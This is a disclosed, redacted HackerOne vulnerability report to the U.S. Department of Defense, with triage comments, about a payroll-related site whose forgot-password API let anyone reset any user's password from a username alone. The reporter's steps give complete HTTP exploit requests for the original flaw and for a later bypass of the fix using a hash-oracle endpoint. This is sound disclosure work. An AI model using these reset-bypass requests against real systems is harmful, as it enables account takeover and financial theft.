{"id":566811,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjY4MTE=","url":"https://hackerone.com/reports/566811","title":"████ - Complete account takeover","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-05-04T23:06:13.482Z","submitted_at":"2019-05-04T23:06:13.482Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cablej_dds","url":"/cablej_dds","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/297/403/7f80f45b8c434ad0da25b685ea053058c6d0a1ce_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-05-11T16:49:56.744Z","bug_reporter_agreed_on_going_public_at":"2019-12-07T21:13:54.931Z","team_member_agreed_on_going_public_at":"2020-05-11T16:49:56.673Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\n\n███████ ██████████ was updated today (03/04), which includes a backend rewrite. Unfortunately, the new site is insecure and allows a password to be reset given only a username. This allows access to payment records for any DoD employee given only their username, which is commonly known. Further, ███ is used to authenticate to other sites such as ██████. Thus, this allows access to the complete ████████ record and other associated information (despite ████████ stating that ██████████ login is disabled, it still works).\n\n## Impact\n\nTrivial and complete compromise of any/all ████████ ███████ accounts, resulting in exposure and modification of sensitive financial records for all DoD civilian/military personnel. For instance, this exposes partial social security numbers, personal addresses, and pay history, and allows stealing funds by changing direct deposit information. Further, via associated sites (█████), this exposes the ██████ of all military service members.\n\n## Step-by-step Reproduction Instructions\n\n1. Visit https://████████/ and intercept a request to obtain valid cookies.\n2. Make the following request, replacing the cookies with your new cookies if needed:\n\n```\nPOST /api/session/personalsettings/ForgotPasswordChangeRequest HTTP/1.1\nHost: ███\nConnection: close\nContent-Length: 151\nAccept: application/json, text/plain, */*\nOrigin: https://█████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nContent-Type: application/json\nReferer: https://████████/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: LastMRH_Session=█████; F5_ST=██████; MRHSession=████████████████████\n\n{\"Username\":\"x\",\"Password\":\"y\",\"IsLimitedAccessAccount\":false,\"HasNagC\":false,\"HasNagF\":false,\"HasNagM\":false,\"HasNagN\":false}\n```\n\n3. Enter any user's username and a new password.\n4. Submit the request. The user's password will be overwritten to the new password, and you may now log in.\n5. Visit https://██████/milconnect/. Select to log in via █████. Despite the message saying it is disabled, edit the form via developer tools to enable both text boxes and the login button. Enter the user's credentials.\n6. The login will be successful, allowing full access to the user's ███.\n\n## Suggested Mitigation/Remediation Actions\n\nEnforce social security number / security questions / email verification.\n\n## Impact\n\n.","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":24,"voters":["base_64","mik317","dastan_9408","sa1tama0","jerry1729","dfirefire","turinggu","i_sell_to_the_highest_bidder","sharontlin","xlbuckcrytplx","and 14 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4744187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2019-05-04T23:06:13.710Z","updated_at":"2019-05-04T23:06:13.710Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4748755,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As of now, ████ is back online after being taken down. Some changes have been made to attempt addressing this issue. However, it is possible to bypass these changes and still reset a password for any account given only the login id.\n\nSummary of changes:\n\n█████ added required `ClientHash` and `ServerHash` parameters to the forgot password endpoint. From what I could tell, ClientHash is an md5 hash of the responses to the security questions, and ServerHash is a MAC that computes server-side an authenticated hash of the ClientHash. However, the `/api/session/personalsettings/checkpasswordresetquestions` endpoint returns ServerHash for any arbitrary ClientHash, and further the forgot password endpoint only checks if ServerHash was properly generated from ClientHash. Thus, it is possible to provide an arbitrary ClientHash and ServerHash and still proceed with the above attack.\n\nSteps to reproduce:\n\n1) Make the following request to `/api/session/personalsettings/checkpasswordresetquestions`, updating cookies as described in the original report if necessary:\n\n```\nPOST /api/session/personalsettings/checkpasswordresetquestions HTTP/1.1\nHost: ████\nConnection: close\nContent-Length: 85\nAccept: application/json, text/plain, */*\nOrigin: https://█████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nContent-Type: application/json\nReferer: https://███/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: V7jzrRgqOnfycG9hpvw59A%3d%3d=███; M%2fq7ofHjaGF5c8fliUg6XA%3d%3d=███; VKPref=NONE; fr33FKVLUGclAp0oxHXQyA%3d%3d=█████; BIGipServer██████████.app~██████████_pool=█████; LastMRH_Session=█████████; F5_ST=█████; MRHSession=█████████; TS01b5a2de=███\n\n{\"Login\":\"x\",\"ResetQuestions\":{\"7\":\"test\",\"19\":\"test\",\"23\":\"tesft\"},\"ClientHash\":\"0\"}\n```\n\n2) The server will return `{\"ServerHash\":\"████\"}`, which is the server-side hash of the provided ClientHash.\n\n3) Make the following request to `/api/session/personalsettings/ForgotPasswordReset`, updating cookies if necessary:\n\n```\nPOST /api/session/personalsettings/ForgotPasswordReset HTTP/1.1\nHost: ████████\nConnection: close\nContent-Length: 215\nAccept: application/json, text/plain, */*\nOrigin: https://███████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nContent-Type: application/json\nReferer: https://██████/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: V7jzrRgqOnfycG9hpvw59A%3d%3d=███████; M%2fq7ofHjaGF5c8fliUg6XA%3d%3d=██████; VKPref=NONE; fr33FKVLUGclAp0oxHXQyA%3d%3d=█████████; BIGipServer█████.app~█████_pool=██████; LastMRH_Session=█████████; F5_ST=█████; MRHSession=█████████; TS01b5a2de=███\n\n{\"Username\":\"x\",\"Password\":\"new_pass\",\"IsLimitedAccessAccount\":false,\"ClientHash\":\"0\",\"ServerHash\":\"███████\"}\n```\n\n(Note that the ClientHash and ServerHash from the previous request are already in the body, so these should not be necessary to update)\n\n4) The user's password will be updated and you may log in as usual.\n\nThanks.","automated_response":false,"created_at":"2019-05-05T17:17:07.697Z","updated_at":"2020-05-11T16:03:14.216Z","actor":{"username":"cablej_dds","cleared":false,"url":"/cablej_dds","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/403/7f80f45b8c434ad0da25b685ea053058c6d0a1ce_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4757864,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-05-06T15:49:28.882Z","updated_at":"2019-05-06T15:49:28.882Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":379403},"actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4757865,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-05-06T15:49:29.737Z","updated_at":"2019-05-06T15:49:29.737Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4782337,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey ███, when you have a moment can you take a look at the ███████ reports you submitted and see if the system owners fix actions worked?  None of us here have logins to the site...we're all contractors.  Can't test these particular reports. ","automated_response":false,"created_at":"2019-05-08T14:31:30.268Z","updated_at":"2020-05-11T16:49:41.863Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4898348,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @ag3nt-j1,\n\nI was able to retest, and it does appear that ████'s fix is sufficient for this reported issue.\n\nThanks,\n█████████","automated_response":false,"created_at":"2019-05-22T03:23:03.461Z","updated_at":"2020-05-11T15:57:13.874Z","actor":{"username":"cablej_dds","cleared":false,"url":"/cablej_dds","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/403/7f80f45b8c434ad0da25b685ea053058c6d0a1ce_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4910238,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks █████, appreciate it.  ","automated_response":false,"created_at":"2019-05-23T13:31:13.478Z","updated_at":"2020-05-11T15:57:13.868Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4910240,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-05-23T13:31:20.398Z","updated_at":"2019-05-23T13:31:20.398Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4910241,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-05-23T13:31:29.994Z","updated_at":"2019-05-23T13:31:29.994Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"cablej_dds","url":"/cablej_dds"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6491583,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-12-07T21:13:54.949Z","updated_at":"2019-12-07T21:13:54.949Z","first_to_agree":true,"actor":{"username":"cablej_dds","cleared":false,"url":"/cablej_dds","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/403/7f80f45b8c434ad0da25b685ea053058c6d0a1ce_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6506798,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will put it in the queue for disclosure.","automated_response":false,"created_at":"2019-12-09T21:12:39.199Z","updated_at":"2019-12-09T21:12:39.199Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7965095,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-05-11T16:49:56.687Z","updated_at":"2020-05-11T16:49:56.687Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7965096,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-05-11T16:49:57.057Z","updated_at":"2020-05-11T16:49:57.057Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7965098,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2020-05-11T16:50:02.707Z","updated_at":"2020-05-11T16:50:02.707Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}